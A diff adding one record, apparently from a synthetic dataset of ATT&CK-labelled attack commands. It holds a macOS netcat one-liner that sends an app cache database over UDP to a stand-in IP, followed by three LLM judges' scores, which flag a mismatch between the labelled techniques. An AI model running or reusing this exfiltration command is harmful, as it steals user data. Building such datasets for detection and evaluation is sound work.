@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -u -s \"$(networksetup -getinfo 'Bluetooth PAN' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.23 55391 < ~/Library/Application\\ Support/AppCache/cache.db",
+  "explanation": "Sends a file via UDP bound to the Bluetooth PAN address, leveraging a non-primary medium consistent with T1011.",
+  "rationale_steps": [
+    "Resolve Bluetooth PAN IP using networksetup",
+    "Bind UDP socket to that IP with netcat",
+    "Transmit data to a non-standard UDP port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-9b5bbd03",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for nc, correct use of command substitution, and proper path escaping.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over UDP from a non-standard interface (Bluetooth PAN), it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1485 (Data Destruction) as specified in the technique description.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T00:52:05.778692Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command substitution, and proper file redirection for a Bash shell on macOS.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration by sending a file's contents over UDP, which is not an act of data destruction as defined by MITRE ATT&CK T1011.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T00:52:11.444362Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid nc flags (-u, -s), proper command substitution, and correct input redirection and path escaping.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs UDP file exfiltration bound to a Bluetooth PAN address, which is not aligned with the provided Data Destruction technique description.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T00:52:51.993156Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
